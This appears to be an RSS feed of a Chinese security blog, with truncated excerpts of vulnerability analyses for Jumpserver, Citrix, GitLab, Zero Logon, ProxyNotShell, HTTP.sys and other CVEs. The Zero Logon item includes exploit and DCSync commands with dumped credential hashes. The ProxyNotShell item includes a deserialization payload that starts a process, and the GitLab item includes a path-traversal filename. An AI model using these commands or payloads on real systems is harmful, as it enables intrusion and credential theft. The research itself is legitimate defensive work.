<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞分析 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/</link><description>Recent content in 漏洞分析 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 08 Sep 2021 21:49:43 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/vulnerability/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</link><pubDate>Fri, 29 Sep 2023 20:32:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</guid><description>基本信息 jumpserver中第三方库向用户公开了随机库所用的seed，并且没有限制重置密码接口的次数，导致攻击者可以获取到随机库的随机种子并尝试预测重置密码的验证码，进而重置任意用户密码。 利用该漏洞需要已知用户名和对应的邮箱。
指纹 hunter
web.title=&amp;#34;jumpserver&amp;#34; 影响版本 CVE-2023-42820 v2.24 - v3.6.4 环境搭建 参考
https://github.com/jumpserver/Dockerfile，将版本改为3.6.4，使用docker启动即可。
技术分析&amp;amp;调试 补丁分析 漏洞在commit 0eba6d2175ab752399c5aee2dbaaf311bf0a398d修复，查看补丁，可知在apps/common/utils/random.py#random_string处增加了 random.seed()调用，同时对 apps/users/models/user.py#generate_reset_token生成token改为增加了 random.seed调用的random_string函数 到这里只能隐约猜到是一个密码学有关的漏洞，应该可以通过爆破利用。
技术分析 在前两天有师傅写出了分析，才恍然大悟。
根据
jumpserver最新re-auth复现（伪随机经典案例）可知在本例的jumpserver中在如下地方生成重置密码时的验证码，其中使用了本次修复的函数 random_string生成6位，范围为000000-999999的数字验证码
opt/jumpserver/apps/authentication/api/password.py def create(self, request, *args, **kwargs): token = request.GET.get(&amp;#39;token&amp;#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(&amp;#39;authentication:forgot-previewing&amp;#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(&amp;#39;username&amp;#39;) form_type = serializer.validated_data[&amp;#39;form_type&amp;#39;] code = random_string(6, lower=False, upper=False) with open(&amp;#34;/tmp/code&amp;#34;,&amp;#34;a&amp;#34;) as f: f.write(code+&amp;#34;\n&amp;#34;) other_args = {} target = serializer.validated_data[form_type] if form_type == &amp;#39;sms&amp;#39;: query_key = &amp;#39;phone&amp;#39; target = target.</description></item><item><title>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</link><pubDate>Tue, 19 Sep 2023 10:26:14 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</guid><description>基本信息 Windows error resporting service中存在权限提升漏洞，当攻击者可以创建符号链接及目录时，可以利用这个漏洞提升至SYSTEM权限。
影响版本 略
环境搭建 Windows 10 21H2 6月补丁 技术分析&amp;amp;调试 补丁对比 diff wercplsupport.dll，主要改了CWerComReport::SubmitReport，wercplsupport.dll是Windows error reporting 服务的主dll文件。
对比发现补丁直接阻断了后续CAutoImpersonate::ImpersonateUserHighestPrivs和CWerComReport::_SubmitReport的调用
//未修复 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)&amp;amp;v12), v10 &amp;gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)&amp;amp;v12); return (unsigned int)v10; } // 修复代码 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v11; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; if ( (unsigned __int8)wil::details::FeatureImpl&amp;lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&amp;gt;::__private_IsEnabled(&amp;amp;`wil::Feature&amp;lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&amp;gt;::GetImpl&amp;#39;::`2&amp;#39;::impl) ) return 0x80004001i64; v12 = 2; if ( !</description></item><item><title>CVE-2023-38148 Windows Ics Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</link><pubDate>Mon, 18 Sep 2023 16:18:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</guid><description>基本信息 依赖于ICS服务，Internet Connect Sharing，对应注册表，依赖ipnathlp.dll
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess 漏洞存在于处理DHCP请求时，由于没有检查边界，导致在使用memset时使用的长度参数来源于数据包内，可以导致栈溢出。 服务调试参考第二个参考链接。
影响版本 略
环境搭建 参考 https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md ，同时加一个Linux，网卡使用第二个网卡，使得Linux发出的DHCP包能够被Windows接收到。
技术分析&amp;amp;调试 静态分析 对比补丁修复前后的逻辑，有两个明显的不同点，有两种产生漏洞的可能的地方。
在修复版本中在进行 if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u )判断之前先调用了 DumpDhcpHeaderInfo，在漏洞代码中先进行判断在调用DumpDhcpHeaderInfo 在修复版本中如果满足 if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u ) 则进入if内，在结束if语句时会通过跳转略过一部分处理逻辑，而在未修复版本内则还会继续处理。 可以看出 a2 + 230为_NH_BUFFER 结构体内的某个长度字段，该处为判断这个长度字段存储的长度，该漏洞应该是溢出漏洞，并且在产生漏洞的地方需要读取该字段。
所以漏洞应该是第二点所说的，产生在略过的逻辑中。
// 未修复代码 void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(&amp;amp;v12, 0, 0x40ui64); if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u ) { if ( v4 !</description></item><item><title>CVE-2023-3519 Cirtix Gateway RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</link><pubDate>Thu, 27 Jul 2023 10:48:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</guid><description>基本信息 Citrix ADC 及 Citrix Gateway 中存在缓冲区溢出漏洞，未授权的攻击者可以通过发送特殊请求触发漏洞，造成RCE。
影响版本 NetScaler ADC 、NetScaler Gateway 13.1 &amp;lt; 13.1-49.13 NetScaler ADC 、NetScaler Gateway 13.0 &amp;lt; 13.0-91.13 NetScaler ADC 13.1-FIPS &amp;lt; 13.1-37.159 NetScaler ADC 12.1-FIPS &amp;lt; 12.1-55.297 NetScaler ADC 12.1-NDcPP &amp;lt; 12.1-55.297
环境搭建 申请开发者试用，配置Citrix Gateway 技术分析&amp;amp;调试 根据国外安全研究员研究，该漏洞存在于/netscaler/nsppe文件内，diff修复前和修复后的nsppe，主要修改了ns_aaa_gwtest_get_event_and_target_names等几个函数 转到ns_aaa_gwtest_get_event_and_target_names函数，对比修复和未修复的代码，主要在调用ns_aaa_saml_url_decode函数时对v29添加了校验。 跟进ns_aaa_saml_url_decode函数，进入ns_aaa_saml_url_decode_inner
__int64 __fastcall ns_aaa_saml_url_decode(__int64 a1, __int64 a2, __int64 a3) { return ns_aaa_saml_url_decode_inner(a1, a2, a3, 1LL); } 在ns_aaa_saml_url_decode_inner函数中a1是一个char指针，指向了http请求的url，在do while循环时遍历a1数组，当当前a1指向的字符是%，则获取到该字符后面两个字符通过datatable_ascii2bin得到对应的字符并写入到v4指向的数组内，实际上这里是url解码操作，解码后写入v4数组。 如果当前字符不是%则判断是不是+号，是+号则在v4数组内写入空格。两个都不是则直接写入到v4内，可以看出这块代码是在对传入的字符串判断是否为url编码如果是则进行url解码，如果不是则直接写入v4数组。
__int64 __fastcall ns_aaa_saml_url_decode_inner(char *a1, _BYTE *a2, int a3, int a4) { _BYTE *v4; // rax unsigned __int64 v5; // r8 char v6; // bl char *v7; // r9 char v8; // r10 char v9; // r11 LODWORD(v4) = (_DWORD)a2; if ( a3 ) { v5 = (unsigned __int64)&amp;amp;a1[a3]; v4 = a2; do { v6 = *a1; if ( *a1 == &amp;#39;%&amp;#39; ) { v7 = a1 + 2; if ( (unsigned __int64)(a1 + 2) &amp;lt; v5 ) { v8 = a1[1]; if ( (unsigned __int8)(v8 - 48) &amp;lt;= 9u ) { v9 = *v7; if ( (unsigned __int8)(*v7 - 48) &amp;lt; 0xAu || (unsigned __int8)((v9 | 0x20) - 97) &amp;lt; 6u ) { if ( v9 !</description></item><item><title>Smartbi Rce</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</link><pubDate>Fri, 16 Jun 2023 16:07:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</guid><description>基本信息 Smartbi是广州思迈特软件有限公司旗下的商业智能BI和数据分析品牌，为企业客户提供一站式商业智能解决方案。Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。
Smartbi大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用stub接口构造请求绕过补丁限制，进而控制JDBC URL，最终可导致远程代码执行或信息泄露。
引用自
奇安信NOX
影响版本 V7&amp;lt;= Smartbi &amp;lt;= V10.5.8
环境搭建 官网下载Smartbi V10.5.8即可，直接安装。
技术分析&amp;amp;调试 解包官网提供的补丁包，可以发现如下：
{ &amp;#34;version&amp;#34;: &amp;#34;1.0&amp;#34;, &amp;#34;date&amp;#34;: &amp;#34;2023-02-28 15:00:00&amp;#34;, &amp;#34;patches&amp;#34;: { &amp;#34;PATCH_20230228&amp;#34;: { &amp;#34;desc&amp;#34;: &amp;#34;修复了利用stub接口对 ‘DB2 命令执行漏洞’ 补丁进行绕过的远程命令执行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;desc_zh_TW&amp;#34;: &amp;#34;修復了利用stub接口對 ‘DB2 命令執行漏洞’ 補丁進行繞過的遠程命令執行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;desc_en&amp;#34;: &amp;#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;urls&amp;#34;: [{ &amp;#34;url&amp;#34;: &amp;#34;*.stub&amp;#34;, &amp;#34;rules&amp;#34;: [{ &amp;#34;type&amp;#34;: &amp;#34;RejectStubPostPatchRule&amp;#34; }] }] }, &amp;#34;PATCH_20221122&amp;#34;: { &amp;#34;desc&amp;#34;: &amp;#34;修复了 DB2 命令执行漏洞 (Patch.</description></item><item><title>CVE-2023-2825 Gitlab 路径穿越漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</link><pubDate>Fri, 26 May 2023 10:36:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</guid><description>基本信息 在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。
影响版本 GitLab 16.0.0
环境搭建 用docker起环境
docker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 技术分析&amp;amp;调试 一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了spec\support\shared_examples\requests\uploads_actions_shared_examples.rb 文件。
根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看
# frozen_string_literal: true RSpec.shared_examples &amp;#39;uploads actions&amp;#39; do describe &amp;#34;GET #show&amp;#34; do context &amp;#39;with file traversal in filename parameter&amp;#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { &amp;#34;../../../../../../../../../Gemfile.lock&amp;#34; } let(:escaped_filename) { CGI.</description></item><item><title>Zero Logon 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</link><pubDate>Mon, 08 May 2023 14:39:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</guid><description>基本信息 Netlogon协议认证过程： 影响版本 略
环境搭建 win server 2012 技术分析&amp;amp;调试 利用 域环境使用Windows server 2012R2搭建，先用
脚本重置域账户密码 python cve-2020-1472-exploit.py WIN2016 192.168.52.130 并抓取数据包 重置之后域账户的密码为空，对应hash为31d6cfe0d16ae931b73c59d7e0c089c0
安装impacket：
python3 -m pipx install impacket pipx ensurepath 使用impacket的secretsdump进行Dcsync，得到Administratr账户的NTLM hash secretsdump.py cqy.io/WIN2016\$@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy\\administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6 Administrator:des-cbc-md5:f732d313b5e92585 [*] Cleaning up... PoC分析 关键代码是下面这个函数，参数rpc_con是DCERPC_v5对象，描述了rcp链接，</description></item><item><title>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</link><pubDate>Fri, 05 May 2023 20:59:45 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</guid><description>基本信息 在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。
环境搭建 操作系统 windows 10 调试器 windbg 技术分析&amp;amp;调试 PoC
#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include &amp;lt;http.h&amp;gt; #include &amp;lt;sspi.h&amp;gt; #include &amp;lt;strsafe.h&amp;gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // 初始化HTTP服务器驱动 retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode !</description></item><item><title>CVE-2023-28432 MinIO 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</link><pubDate>Fri, 05 May 2023 20:53:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</guid><description>基本信息 Minio是一个多云对象存储框架。在从 RELEASE.2019-12-17T23-16-33Z 开始且 RELEASE.2023-03-20T20-16-18Z 之前的集群部署中，MinIO 返回所有环境变量，包括“MINIO_SECRET_KEY”和“MINIO_ROOT_PASSWORD”，从而导致信息泄露。分布式部署的所有用户都会受到影响。建议所有用户升级到发布版本.2023-03-20T20-16-18Z。
指纹 web.title=&amp;ldquo;minio&amp;rdquo;
影响版本 2019-12-17t23-16-33z &amp;lt;= Minio &amp;lt; 2023-03-20t20-16-18z
环境搭建 使用Docker启动4个minio即可。
技术分析&amp;amp;调试 补丁分析 对比修复版本和未修复版本 https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z&amp;hellip;RELEASE.2023-03-20T20-16-18Z可知漏洞在commit https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077修复，查看修复代码，可以知道在 cmd/bootstrap-peer-server.go#VerifyHandler方法中增加了鉴权逻辑： func storageServerRequestValidate(r *http.Request) error { token, err := jwtreq.AuthorizationHeaderExtractor.ExtractToken(r) if err != nil { if err == jwtreq.ErrNoTokenInRequest { return errNoAuthToken } return errMalformedAuth } claims := xjwt.NewStandardClaims() if err = xjwt.ParseWithStandardClaims(token, claims, []byte(globalActiveCred.SecretKey)); err != nil { return errAuthentication } owner := claims.AccessKey == globalActiveCred.AccessKey || claims.</description></item><item><title>Proxy Not Shell</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</link><pubDate>Fri, 05 May 2023 20:35:49 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</guid><description>漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：
CVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。
CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。
在PoC中发送了以下三种类型的PSRP消息
0x00010002 SESSION_CAPABILITY
SESSION_CAPABILITY 应该是创建RunspacePool
0x00010004 INIT_RUNSPACEPOOL
INIT_RUNSPACEPOOL 应该是初始化RunspacePool
0x00021006 CREATE_PIPELINE
创建命令管道并在指定的 RunspacePool 中调用它
PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。
PoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象
&amp;lt;Obj N=&amp;#34;V&amp;#34; RefId=&amp;#34;14&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;ToString&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/ToString&amp;gt; &amp;lt;Props&amp;gt; &amp;lt;S N=&amp;#34;Name&amp;#34;&amp;gt;Type&amp;lt;/S&amp;gt; &amp;lt;Obj N=&amp;#34;TargetTypeForDeserialization&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.Exception&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;MS&amp;gt; &amp;lt;BA N=&amp;#34;SerializationData&amp;#34;&amp;gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=&amp;lt;/BA&amp;gt; &amp;lt;/MS&amp;gt; &amp;lt;/Obj&amp;gt; &amp;lt;/Props&amp;gt; &amp;lt;S&amp;gt; &amp;lt;![CDATA[&amp;lt;ResourceDictionary xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34; xmlns:System=&amp;#34;clr-namespace:System;assembly=mscorlib&amp;#34; xmlns:Diag=&amp;#34;clr-namespace:System.Diagnostics;assembly=system&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider x:Key=&amp;#34;LaunchCalch&amp;#34; ObjectType=&amp;#34;{x:Type Diag:Process}&amp;#34; MethodName=&amp;#34;Start&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider.</description></item><item><title>CVE-2021-40449 Win32k 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</link><pubDate>Tue, 09 Nov 2021 15:16:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</guid><description>CVE-2021-40449 Win32k提权漏洞及POC分析 背景 CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。
基本概念 内核对象：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。
内核对象的引用计数：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：
在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。
句柄：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。
句柄表：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。
https://www.cnblogs.com/MisterXu/p/10846918.html
DC：是一个内核对象，全称device context，设备上下文对象
HDC：DC对象的句柄。
释放后重用：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。
eg：
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; void method(); void badMethod(); // 定义函数指针 typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new test对象 test *t = new test(); test *p = t; t-&amp;gt;p = method; p-&amp;gt;p(); // 释放t指向的test对象的空间 delete t; test *pt; for (size_t i = 0; i &amp;lt; 10000; i++) { // 占用刚释放的对象的内存空间 pt = (test *)malloc(sizeof(test)); // 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址 pt-&amp;gt;p = badMethod; } // 这里原意想要调用method函数，但是实际调用了badMethod函数 printf(&amp;#34;第二次调用\n&amp;#34;); p-&amp;gt;p(); return 0; } void method() { printf(&amp;#34;method\n&amp;#34;); } void badMethod() { printf(&amp;#34;bad method\n&amp;#34;); } 漏洞形成分析 该漏洞产生于win32kfull!</description></item></channel></rss>